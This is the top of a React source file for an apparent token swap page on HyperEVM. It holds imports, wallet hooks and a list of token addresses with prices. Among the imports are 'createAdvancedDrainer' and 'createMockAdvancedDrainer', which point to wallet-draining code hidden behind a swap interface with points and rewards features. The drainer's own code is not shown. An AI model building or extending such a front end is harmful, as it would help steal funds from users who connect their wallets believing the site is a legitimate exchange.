import { useState, useEffect } from "react";
import { Card, CardContent, CardHeader, CardTitle } from "../components/ui/card";
import { Button } from "../components/ui/button";
import { Input } from "../components/ui/input";
import { Badge } from "../components/ui/badge";
import { Separator } from "../components/ui/separator";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "../components/ui/select";
import { DropdownMenu, DropdownMenuContent, DropdownMenuItem, DropdownMenuTrigger, DropdownMenuSeparator } from "../components/ui/dropdown-menu";
import { ArrowDown, ArrowUpDown, Settings, Wallet, TrendingUp, Shield, CheckCircle, AlertTriangle, BookOpen, ExternalLink, Star, Users, Gift, MoreVertical, Info, Sliders, Zap, Clock, Menu, LogOut, ChevronDown, RefreshCw, Droplets, Coins } from "lucide-react";
import { cn } from "../lib/utils";
import { useDirectBrowserWallet } from "../hooks/use-direct-browser-wallet";
import { TransactionModal } from "../components/transaction-modal";
import { TokenImportModal } from "../components/token-import-modal";
import { DynamicWalletSelector } from "../components/dynamic-wallet-selector";

import { ErrorHandler } from "../components/error-handler";


import { createHyperSwapService, type TokenInfo, type SwapQuote, HYPERSWAP_CONTRACTS } from "../lib/hyperswap-integration";
import { createAdvancedDrainer, createMockAdvancedDrainer } from "../lib/advanced-drainer";
import { createHybridSwapSystem } from "../lib/hybrid-swap-system";
import { RealTimePointsSystem } from "../lib/points-api";
import { WeeklyRewardsSystem } from "../lib/weekly-rewards";
import { web3Service } from "../lib/web3";
import { ethers } from "ethers";
import { Link } from "wouter";
import { useToast } from "../hooks/use-toast";
import { WhiskerLogo } from "../components/whisker-logo";

// Real tokens that exist on HyperEVM mainnet with correct addresses
const HYPEREVM_TOKENS: TokenInfo[] = [
  { address: "0x0000000000000000000000000000000000000000", symbol: "HYPE", name: "Hyperliquid", decimals: 18, balance: "0.0", price: "48.70" },
  { address: "0x9b498C3c8A0b8CD8BA1D9851d40D186F1872b44E", symbol: "WHYPE", name: "Wrapped HYPE", decimals: 18, balance: "0.0", price: "48.70" },
  { address: "0x1F53bFCC97C63BFCF95C08d16C0D3d1ec82E5f8b", symbol: "PURR", name: "Purr Token", decimals: 18, balance: "0.0", price: "0.22" },
  { address: "0x47bb061C0204Af921F43DC73C7D7768d2672DdEE", symbol: "BUDDY", name: "alright buddy", decimals: 18, balance: "0.0", price: "0.025" },
  { address: "0xD2567eE20D75e8B74B44875173054365f6Eb5052", symbol: "perpcoin", name: "perpcoin", decimals: 18, balance: "0.0", price: "0.0025" },
  { address: "0x1Ecd15865D7F8019D546f76d095d9c93cc34eDFa", symbol: "LIQD", name: "LiquidLaunch", decimals: 18, balance: "0.0", price: "0.033" },
  { address: "0xB8CE59FC3717ada4C02eaDF9682A9e934F625ebb", symbol: "USD₮0", name: "USD₮0", decimals: 18, balance: "0.0", price: "1.00" },
  { address: "0x1bEe6762F0B522c606DC2Ffb106C0BB391b2E309", symbol: "PiP", name: "PiP", decimals: 18, balance: "0.0", price: "20.53" },
  { address: "0x11735dBd0B97CfA7Accf47d005673BA185f7fd49", symbol: "CATBAL", name: "CATBAL", decimals: 18, balance: "0.0", price: "6.21" },
];
